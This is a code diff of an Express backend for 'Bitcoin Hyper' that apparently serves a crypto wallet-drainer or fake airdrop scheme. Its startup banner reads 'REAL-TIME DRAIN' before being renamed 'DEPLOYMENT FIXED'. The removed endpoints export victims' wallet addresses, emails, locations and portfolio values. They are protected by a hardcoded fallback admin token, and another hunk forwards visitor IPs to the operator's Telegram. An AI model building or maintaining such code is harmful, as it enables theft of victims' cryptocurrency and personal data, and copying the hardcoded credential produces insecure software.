-    const format = req.query.format || 'json';
-    
-    if (format === 'csv') {
-      let csv = 'Wallet,Email,Country,City,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash\n';
-      
-      memoryStorage.participants.forEach(p => {
-        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}"\n`;
-      });
-      
-      res.header('Content-Type', 'text/csv');
-      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-data.csv');
-      res.send(csv);
-      
-    } else {
-      res.json({
-        success: true,
-        data: {
-          participants: memoryStorage.participants,
-          activityLog: memoryStorage.activityLog,
-          statistics: memoryStorage.settings.statistics,
-          analytics: memoryStorage.analytics,
-          sessions: memoryStorage.sessions,
-          exportTime: new Date().toISOString(),
-          totalRecords: memoryStorage.participants.length
-        }
-      });
-    }
-    
-  } catch (error) {
-    console.error('Export error:', error);
-    res.status(500).json({ success: false, error: 'Export failed' });
-  }
-});
-
-// Activity log endpoint
-app.get('/api/admin/activity', async (req, res) => {
-  try {
-    const auth = req.headers.authorization;
-    if (!auth || !auth.startsWith('Bearer ')) {
-      return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
-    const token = auth.replace('Bearer ', '');
-    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
-      return res.status(401).json({ error: 'Invalid token' });
-    }
-    
-    const { limit = 100, action, startDate, endDate } = req.query;
-    
-    let filteredLogs = [...memoryStorage.activityLog];
-    
-    if (action) {
-      filteredLogs = filteredLogs.filter(log => log.action === action);
-    }
-    
-    if (startDate) {
-      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) >= new Date(startDate));
-    }
-    
-    if (endDate) {
-      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) <= new Date(endDate));
-    }
-    
-    const recentLogs = filteredLogs
-      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-      .slice(0, parseInt(limit));
-    
-    res.json({ 
-      success: true, 
-      logs: recentLogs, 
-      total: filteredLogs.length,
-      filtered: action || startDate || endDate 
-    });
-    
-  } catch (error) {
-    console.error('Activity log error:', error);
-    res.status(500).json({ success: false, error: 'Failed to get activity logs' });
-  }
 });
 
 // Telegram chat ID helper
@@ -1657,7 +1709,7 @@ app.use((err, req, res, next) => {
       const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
       bot.telegram.sendMessage(
         memoryStorage.settings.telegram.chatId,
-        `🔥 *CRITICAL ERROR*\n\nRoute: ${req.originalUrl}\nError: ${err.message}\nIP: ${clientIP}\nSession: ${req.sessionID}\n⏰ ${new Date().toLocaleString()}`,
+        `🔥 *CRITICAL ERROR*\n\nRoute: ${req.originalUrl}\nError: ${err.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
         { parse_mode: 'Markdown' }
       );
     } catch (tgError) {
@@ -1684,7 +1736,7 @@ app.use('*', (req, res) => {
 // Start server
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`
-  🚀 BITCOIN HYPER BACKEND v4.0.0 - REAL-TIME DRAIN
+  🚀 BITCOIN HYPER BACKEND v4.0.0 - DEPLOYMENT FIXED
   ================================================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
